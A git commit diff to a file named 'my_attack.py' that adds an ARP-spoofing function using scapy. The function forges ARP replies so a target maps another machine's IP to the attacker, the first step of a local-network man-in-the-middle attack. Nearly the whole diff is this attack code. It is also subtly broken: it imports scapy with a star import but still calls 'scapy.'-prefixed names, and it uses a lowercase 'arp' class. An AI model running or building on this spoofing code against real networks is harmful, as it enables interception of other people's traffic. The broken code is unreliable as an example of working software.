4ae139720c3efc7ffdd13abee85fc559c864804c
Adi Vered <veredfamily36@gmail.com>
2025-07-19 00:43:11 +0300

    spoof function 1/2

--- my_attack.py
+++ my_attack.py
@@ -1,4 +1,5 @@
-import scapy.all as scapy
+from scapy import *
+import os
 
 target_ip = "" 
 self_ip = ""
@@ -7,6 +8,11 @@ interface = ""
 def find_mac_address(ip):
     packet = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")/scapy.arp(pdst = ip)
     answer = scapy.srp(packet, iface=interface, timeout=2, verbose=False)[0]
-    mac_address = answer[1].hwsrc
+    mac_address = answer[1][0].hwsrc
     return mac_address
  
+def spoof(target_ip, spoofed_ip):
+    packet = scapy.arp(op = 2, hwdst = find_mac_address(target_ip), pdst=target_ip, psrc=spoofed_ip)
+    scapy.send(packet, iface=interface, verbose=False)
+
+
